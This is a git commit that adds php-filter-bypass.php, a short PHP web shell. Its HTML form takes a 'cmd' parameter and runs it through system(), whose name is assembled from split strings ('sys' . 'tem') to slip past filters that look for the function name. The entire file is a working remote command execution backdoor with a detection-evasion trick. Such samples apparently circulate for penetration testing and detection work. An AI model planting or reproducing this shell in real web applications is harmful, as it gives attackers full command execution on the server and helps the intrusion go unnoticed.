8802a0ab36f49fcfa7801f6350f8de701f390d14
Raj Chowdhury <30806882+RajChowdhury240@users.noreply.github.com>
2025-12-01 08:12:20 +0530

    Create php-filter-bypass.php

---
+++ php-filter-bypass.php
@@ -0,0 +1,26 @@
+<html>
+  <body>
+    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+      <input
+        type="TEXT"
+        name="cmd"
+        autofocus
+        id="cmd"
+        size="80"
+      >
+      <input
+        type="SUBMIT"
+        value="Execute"
+      >
+    </form>
+
+    <pre>
+<?php
+if (isset($_GET['cmd'])) {
+    $func_name = "sys" . "tem";
+    $func_name($_GET['cmd']);
+}
+?>
+    </pre>
+  </body>
+</html>
